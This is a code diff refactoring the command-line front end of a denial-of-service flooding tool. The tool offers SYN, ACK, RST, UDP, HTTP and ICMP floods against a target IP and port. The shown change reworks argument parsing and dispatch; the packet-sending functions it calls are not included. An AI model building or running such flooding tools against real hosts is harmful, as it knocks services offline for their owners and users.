@@ -10,6 +10,28 @@
 #include "utils.h"
 #include "types.h"
 
+struct attack_map_t {
+	char *name;
+	int attack_id;
+};
+
+
+struct attack_map_t attack_map[] = {
+	{"syn", ATTACK_TCP_SYN},
+	{"ack", ATTACK_TCP_ACK},
+	{"synack", ATTACK_TCP_SYNACK},
+	{"pshack", ATTACK_TCP_PSHACK},
+	{"ackfin", ATTACK_TCP_ACKFIN},
+	{"rst", ATTACK_TCP_RST},
+	{"all", ATTACK_TCP_ALL},
+	{"null", ATTACK_TCP_NULL},
+	{"udp", ATTACK_UDP},
+	{"get", ATTACK_HTTP_GET},
+	{"post", ATTACK_HTTP_POST},
+	{"ping", ATTACK_ICMP_PING},
+	{NULL, 0}
+};
+
 struct target_data target;
 
 void signal_exit()
@@ -19,24 +41,25 @@ void signal_exit()
 
 void heyelan_usage(char *argv[])
 {
-	fprintf(stdout, "\nusage: %s [attack type] [options]\n\n\
-attack types:\n\n\
-\tsyn : SYN flood attack\n\
-\tack : ACK flood attack\n\
-\tsynack : SYN-ACK flood attack\n\
-\tpshack : PSH-ACK flood attack\n\
-\tackfin : ACK-FIN flood attack\n\
-\trst : RST flood attack\n\
-\tall : all flags flood attack\n\
-\tnull : no flags flood attack\n\
-\tudp : UDP flood attack\n\
-\tget : HTTP GET flood attack\n\
-\tpost : HTTP POST flood attack\n\
-\tping : ICMP ping flood attack\n\n\
-options:\n\n\
-\t-t [target IP address] : target IP address to attack\n\
-\t-p [target port] : target port to attack\n\
-\t-h : help message\n\n", argv[0]);
+	fprintf(stdout,
+		"\nusage: %s [attack type] [options]\n"
+		"\nattack types:\n\n"
+		"\tsyn    : SYN flood attack\n"
+		"\tack    : ACK flood attack\n"
+		"\tsynack : SYN-ACK flood attack\n"
+		"\tpshack : PSH-ACK flood attack\n"
+		"\tackfin : ACK-FIN flood attack\n"
+		"\trst    : RST flood attack\n"
+		"\tall    : all flags flood attack\n"
+		"\tnull   : no flags flood attack\n"
+		"\tudp    : UDP flood attack\n"
+		"\tget    : HTTP GET flood attack\n"
+		"\tpost   : HTTP POST flood attack\n"
+		"\tping   : ICMP ping flood attack\n"
+		"\noptions:\n\n"
+		"\t-t [target IP address] : target IP address to attack\n"
+		"\t-p [target port]       : target port to attack\n"
+		"\t-h                     : help message\n\n", argv[0]);
 	exit(EXIT_FAILURE);
 }
 
@@ -48,31 +71,13 @@ void parse_args(int argc, char *argv[])
 		heyelan_usage(argv);
 	}
 
-	/* what a mess */
-	if (!strncmp(argv[1], "syn", 3) && strlen(argv[1]) == 3)
-		target.attack_type = ATTACK_TCP_SYN;
-	else if (!strncmp(argv[1], "ack", 3) && strlen(argv[1]) == 3)
-		target.attack_type = ATTACK_TCP_ACK;
-	else if (!strncmp(argv[1], "synack", 6))
-		target.attack_type = ATTACK_TCP_SYNACK;
-	else if (!strncmp(argv[1], "pshack", 6))
-		target.attack_type = ATTACK_TCP_PSHACK;
-	else if (!strncmp(argv[1], "ackfin", 6))
-		target.attack_type = ATTACK_TCP_ACKFIN;
-	else if (!strncmp(argv[1], "rst", 3))
-		target.attack_type = ATTACK_TCP_RST;
-	else if (!strncmp(argv[1], "all", 3))
-		target.attack_type = ATTACK_TCP_ALL;
-	else if (!strncmp(argv[1], "null", 4))
-		target.attack_type = ATTACK_TCP_NULL;
-	else if (!strncmp(argv[1], "udp", 3))
-		target.attack_type = ATTACK_UDP;
-	else if (!strncmp(argv[1], "get", 3))
-		target.attack_type = ATTACK_HTTP_GET;
-	else if (!strncmp(argv[1], "post", 4))
-		target.attack_type = ATTACK_HTTP_POST;
-	else if (!strncmp(argv[1], "ping", 4))
-		target.attack_type = ATTACK_ICMP_PING;
+	for (int i = 0; attack_map[i].name != NULL; i++) {
+		if (!strncmp(argv[1], attack_map[i].name, strlen(attack_map[i].name)) &&
+			strlen(argv[1]) == strlen(attack_map[i].name)) {
+			target.attack_type = attack_map[i].attack_id;
+			break;
+		}
+	}
 
 	while ((opt = getopt(argc, argv, "t:p:h")) != -1) {
 		switch (opt) {
@@ -94,6 +99,8 @@ void parse_args(int argc, char *argv[])
 int main(int argc, char *argv[])
 {
 	memset(&target, 0, sizeof(struct target_data));
+	target.attack_type = -1;
+
 	parse_args(argc, argv);
 
 	if (!target.target_addr) {
@@ -103,12 +110,15 @@ int main(int argc, char *argv[])
 
 	init_signal(&signal_exit);
 
-	if (target.attack_type >= ATTACK_TCP_SYN && target.attack_type <= ATTACK_TCP_NULL)
+	if (target.attack_type >= ATTACK_TCP_SYN && target.attack_type <= ATTACK_TCP_NULL) {
 		attack_tcp(&target);
-	else if (target.attack_type == ATTACK_UDP)
+	} else if (target.attack_type == ATTACK_UDP) {
 		attack_udp(&target);
-	else if (target.attack_type == ATTACK_ICMP_PING)
-		attack_icmp_ping(&target);
+	} else if (target.attack_type == ATTACK_ICMP_PING) {
+		attack_icmp(&target);
+	} else {
+		fprintf(stderr, "attack type not specified/attack type is wrong.\n");
+	}
 
 	return 0;
 }
